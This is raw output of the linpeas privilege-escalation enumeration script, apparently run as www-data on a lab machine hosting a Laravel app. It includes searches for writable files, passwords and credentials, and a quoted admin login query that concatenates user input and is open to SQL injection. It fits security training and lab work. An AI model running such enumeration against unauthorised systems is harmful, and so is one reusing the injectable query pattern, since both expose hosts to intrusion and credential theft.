/var/www/laravel/database/seeds
/var/www/laravel/database/seeds/DatabaseSeeder.php
/var/www/laravel/package.json
/var/www/laravel/phpunit.xml
/var/www/laravel/public
/var/www/laravel/public/.htaccess
/var/www/laravel/public/css
/var/www/laravel/public/css/app.css
/var/www/laravel/public/favicon.ico
/var/www/laravel/public/index.php
/var/www/laravel/public/js
/var/www/laravel/public/js/app.js
/var/www/laravel/public/robots.txt
/var/www/laravel/public/web.config
/var/www/laravel/readme.md
/var/www/laravel/resources
/var/www/laravel/resources/assets
/var/www/laravel/resources/assets/js
/var/www/laravel/resources/assets/js/app.js
/var/www/laravel/resources/assets/js/bootstrap.js
/var/www/laravel/resources/assets/js/components
/var/www/laravel/resources/assets/js/components/Example.vue
/var/www/laravel/resources/assets/sass
/var/www/laravel/resources/assets/sass/_variables.scss
/var/www/laravel/resources/assets/sass/app.scss
/var/www/laravel/resources/lang
/var/www/laravel/resources/lang/en
/var/www/laravel/resources/lang/en/auth.php
/var/www/laravel/resources/lang/en/pagination.php
/var/www/laravel/resources/lang/en/passwords.php
/var/www/laravel/resources/lang/en/validation.php
/var/www/laravel/resources/views
/var/www/laravel/resources/views/welcome.blade.php
/var/www/laravel/routes
/var/www/laravel/routes/api.php
/var/www/laravel/routes/channels.php
/var/www/laravel/routes/console.php
/var/www/laravel/routes/web.php
/var/www/laravel/server.php
/var/www/laravel/storage
/var/www/laravel/storage/app
/var/www/laravel/storage/app/.gitignore
/var/www/laravel/storage/app/public
/var/www/laravel/storage/app/public/.gitignore
/var/www/laravel/storage/framework
/var/www/laravel/storage/framework/.gitignore
/var/www/laravel/storage/framework/cache
/var/www/laravel/storage/framework/cache/.gitignore
/var/www/laravel/storage/framework/sessions
/var/www/laravel/storage/framework/sessions/.gitignore
/var/www/laravel/storage/framework/sessions/1Sv4Jq7mcz2rCJLnHoni6cCFwYmc1nwdnsqsY51x
/var/www/laravel/storage/framework/sessions/FN3lutVJT43d3HK689A2l0qvJBtsf2xjj0eSmqso
/var/www/laravel/storage/framework/sessions/WFJ8pBfiayyMMH2S5jzH7JODl27e5oS6OFxzHT0a
/var/www/laravel/storage/framework/sessions/fXZR31RDYlHbTVRXq5fyPzhyASazJV1WLu3yrv9d
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/storage/framework/testing
/var/www/laravel/storage/framework/testing/.gitignore
/var/www/laravel/storage/framework/views
/var/www/laravel/storage/framework/views/.gitignore
/var/www/laravel/storage/framework/views/24f4512b760336fe6f663d547ab4b08077451f92.php
/var/www/laravel/storage/logs
/var/www/laravel/storage/logs/.gitignore
/var/www/laravel/tests
/var/www/laravel/tests/CreatesApplication.php
/var/www/laravel/tests/Feature
/var/www/laravel/tests/Feature/ExampleTest.php
/var/www/laravel/tests/TestCase.php
/var/www/laravel/tests/Unit
/var/www/laravel/tests/Unit/ExampleTest.php
/var/www/laravel/vendor
/var/www/laravel/vendor/autoload.php
/var/www/laravel/vendor/bin
/var/www/laravel/vendor/composer
/var/www/laravel/vendor/composer/ClassLoader.php
/var/www/laravel/vendor/composer/LICENSE
/var/www/laravel/vendor/composer/autoload_classmap.php
/var/www/laravel/vendor/composer/autoload_files.php
/var/www/laravel/vendor/composer/autoload_namespaces.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/dnoegel
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/.gitignore
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/LICENSE
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/README.md
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/composer.json
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/phpunit.xml.dist
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/src/Xdg.php
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests
/var/www/laravel/vendor/dnoegel/php-xdg-base-dir/tests/XdgTest.php
/var/www/laravel/vendor/doctrine
/var/www/laravel/vendor/doctrine/inflector
/var/www/laravel/vendor/doctrine/inflector/.gitignore
/var/www/laravel/vendor/doctrine/inflector/.travis.yml
/var/www/laravel/vendor/doctrine/inflector/LICENSE
/var/www/laravel/vendor/doctrine/inflector/README.md
/var/www/laravel/vendor/doctrine/inflector/composer.json
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine
/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common
/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector
/var/www/laravel/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/Inflector.php
/var/www/laravel/vendor/doctrine/inflector/phpunit.xml.dist
/var/www/laravel/vendor/doctrine/inflector/tests
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/Common/Inflector/InflectorTest.php
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/DoctrineTestCase.php
/var/www/laravel/vendor/doctrine/inflector/tests/Doctrine/Tests/TestInit.php
/var/www/laravel/vendor/doctrine/instantiator
/var/www/laravel/vendor/doctrine/instantiator/.gitignore
/var/www/laravel/vendor/doctrine/instantiator/.scrutinizer.yml
/var/www/laravel/vendor/doctrine/instantiator/.travis.install.sh
/var/www/laravel/vendor/doctrine/instantiator/.travis.yml
/var/www/laravel/vendor/doctrine/instantiator/CONTRIBUTING.md
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/ExceptionInterface.php
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/InvalidArgumentException.php
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Exception/UnexpectedValueException.php
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/Instantiator.php
/var/www/laravel/vendor/doctrine/instantiator/src/Doctrine/Instantiator/InstantiatorInterface.php
/var/www/laravel/vendor/doctrine/instantiator/tests
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorPerformance/InstantiatorPerformanceEvent.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception/InvalidArgumentExceptionTest.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/Exception/UnexpectedValueExceptionTest.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTest/InstantiatorTest.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/AbstractClassAsset.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ArrayObjectAsset.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/ExceptionAsset.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/FinalExceptionAsset.php
/var/www/laravel/vendor/doctrine/instantiator/tests/DoctrineTest/InstantiatorTestAsset/PharAsset.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/erusev
/var/www/laravel/vendor/erusev/parsedown
/var/www/laravel/vendor/erusev/parsedown/.travis.yml
/var/www/laravel/vendor/erusev/parsedown/LICENSE.txt
/var/www/laravel/vendor/erusev/parsedown/Parsedown.php
/var/www/laravel/vendor/erusev/parsedown/README.md
/var/www/laravel/vendor/erusev/parsedown/composer.json
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/erusev/parsedown/test/CommonMarkTest.php
/var/www/laravel/vendor/erusev/parsedown/test/ParsedownTest.php
/var/www/laravel/vendor/erusev/parsedown/test/TestParsedown.php
/var/www/laravel/vendor/erusev/parsedown/test/bootstrap.php
/var/www/laravel/vendor/erusev/parsedown/test/data
/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.html
/var/www/laravel/vendor/erusev/parsedown/test/data/aesthetic_table.md
/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.html
/var/www/laravel/vendor/erusev/parsedown/test/data/aligned_table.md
/var/www/laravel/vendor/erusev/parsedown/test/data/atx_heading.html
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto
/var/www/laravel/vendor/fzaninotto/faker
/var/www/laravel/vendor/fzaninotto/faker/.gitignore
/var/www/laravel/vendor/fzaninotto/faker/.travis.yml
/var/www/laravel/vendor/fzaninotto/faker/CHANGELOG.md
/var/www/laravel/vendor/fzaninotto/faker/CONTRIBUTING.md
/var/www/laravel/vendor/fzaninotto/faker/LICENSE
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Iban.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Calculator/Luhn.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Documentor.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Factory.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Generator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Guesser/Name.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/CakePHP/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Doctrine/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Mandango/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Propel2/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/ColumnTypeGuesser.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/EntityPopulator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/ORM/Spot/Populator.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Barcode.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Base.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Biased.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Color.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Text.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Text.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/at_AT/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bg_BG/PhoneNumber.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/PhoneNumber.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/bn_BD/Utils.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/DateTime.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/cs_CZ/Payment.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/da_DK/Person.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_AT/Person.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_CH/Person.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/de_DE/Person.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Company.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/el_GR/PhoneNumber.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_AU/PhoneNumber.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_CA/PhoneNumber.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Payment.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_GB/PhoneNumber.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Address.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Internet.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/Person.php
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/en_IN/PhoneNumber.php

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
  Group www-data:                                                                 
/var/www/html/linpeas.sh                                                          
/var/www/html/1.txt
/var/www/html/index.html

[+] Searching passwords in config PHP files
                                                                                  
[+] Checking for TTY (sudo/su) passwords in audit logs
                                                                                  
[+] Finding IPs inside logs (limit 70)
     14 /var/log/dpkg.log.1:1.16.04.3                                             
     11 /var/log/dpkg.log.1:1.16.04.1
      7 /var/log/wtmp.1:192.168.150.100
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/wtmp.1:10.10.14.141
      1 /var/log/lastlog:10.10.14.141
      1 /var/log/installer/status:2.21.63.3

[+] Finding passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:           
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log.1:2017-02-15 20:19:39 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:39 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:39 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:39 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:39 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:39 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:43 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:43 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:43 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:43 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:19:56 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-02-15 20:19:56 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-02-15 20:19:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-02-15 20:20:12 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log.1:2017-02-15 20:20:12 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:20:12 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:20:13 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2017-02-15 20:20:26 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log.1:2017-02-15 20:20:26 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-02-15 20:20:26 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-02-15 20:20:26 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 70)
     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com           
     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com
     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com

[+] Finding *password* or *credential* files in home (limit 70)
                                                                                  
[+] Finding passwords inside key folders (limit 70) - only PHP files
/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php:            'password' => 'required|string|min:6|confirmed',                                      
/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php:            'password' => bcrypt($data['password']),                                              
/var/www/laravel/bootstrap/cache/services.php:    'Illuminate\Auth\Passwords\PasswordResetServiceProvider' => 
/var/www/laravel/bootstrap/cache/services.php:    'auth.password' => 'Illuminate\Auth\Passwords\PasswordResetServiceProvider',
/var/www/laravel/bootstrap/cache/services.php:    'auth.password.broker' => 'Illuminate\Auth\Passwords\PasswordResetServiceProvider',
/var/www/laravel/database/factories/ModelFactory.php:        'password' => $password ?: $password = bcrypt('secret'),
/var/www/laravel/resources/lang/en/passwords.php:    'password' => 'Passwords must be at least six characters and match the confirmation.',
./linpeas.sh: 3147: printf: %r: invalid directive
sh: printf: I/O error

[+] Finding passwords inside key folders (limit 70) - no PHP files
/var/www/laravel/CHANGELOG.md:- Remove index from password reset `token` column ([#4180](https://github.com/laravel/laravel/pull/4180))
./linpeas.sh: 3151: printf: %r: invalid directive
sh: printf: I/O error

[+] Finding possible password variables inside key folders (limit 140)
/var/www/laravel/.env:APP_NAME=Laravel                                            
/var/www/laravel/.env:DB_CONNECTION=mysql
/var/www/laravel/.env:DB_DATABASE=homestead
/var/www/laravel/.env:DB_HOST=127.0.0.1
/var/www/laravel/.env:DB_PORT=3306
/var/www/laravel/.env:DB_USERNAME=homestead
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php:        $this->secretKey = $secretKey;
/var/www/laravel/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:            'app_name' => $this->name,
/var/www/laravel/.env:APP_NAME=Laravel
/var/www/laravel/.env:DB_CONNECTION=mysql
/var/www/laravel/.env:DB_DATABASE=homestead
/var/www/laravel/.env:DB_HOST=127.0.0.1
/var/www/laravel/.env:DB_PORT=3306
/var/www/laravel/.env:DB_USERNAME=homestead
/var/www/laravel/vendor/monolog/monolog/src/Monolog/Handler/IFTTTHandler.php:        $this->secretKey = $secretKey;
/var/www/laravel/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:            'app_name' => $this->name,

[+] Finding possible password in config files
 /etc/debconf.conf                                                                
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/init/passwd.conf
passwd - clear locks on passwd and related files
passwd to avoid million duplicate bug reports
passwd locks"
passwd.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock
 /etc/nsswitch.conf
passwd:         compat
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,

[+] Finding 'username' string inside key folders (limit 70)
/var/www/admin/index.php:                  <label>UserName  :</label><input type = "text" name = "username" class = "box"/><br /><br />
/var/www/admin/index.php:      $myusername = $_POST['username'];
/var/www/admin/index.php:      $sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
/var/www/admin/session.php:   $ses_sql = mysqli_query($db,"select username from admin where username = '$user_check' ");
/var/www/laravel/.env:DB_USERNAME=homestead
/var/www/laravel/.env:MAIL_USERNAME=null
/var/www/laravel/config/database.php:            'username' => env('DB_USERNAME', 'forge'),
/var/www/laravel/config/mail.php:    'username' => env('MAIL_USERNAME'),
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:        $username = static::bothify($this->generator->parse($format));                     
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_JO/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ar_SA/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/fa_IR/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ja_JP/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/ko_KR/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/lt_LT/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/src/Faker/Provider/zh_CN/Internet.php:    protected static $userNameFormats = array(
/var/www/laravel/vendor/fzaninotto/faker/test/Faker/Provider/InternetTest.php:        $username = $this->faker->username();
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Cache/MemcachedConnector.php:        list($username, $password) = $credentials;
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php:        list($username, $password) = [
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Database/README.md:    'username'  => 'root',                                                              
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Auth/ThrottlesLogins.php:        $errors = [$this->username() => $message];
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:        $this->username = $username;
/var/www/laravel/vendor/laravel/framework/src/Illuminate/Notifications/Messages/SlackMessage.php:    public function from($username, $icon = null)
/var/www/laravel/vendor/league/flysystem/src/Adapter/AbstractFtpAdapter.php:        $username = $this->safeStorage->retrieveSafely('username');
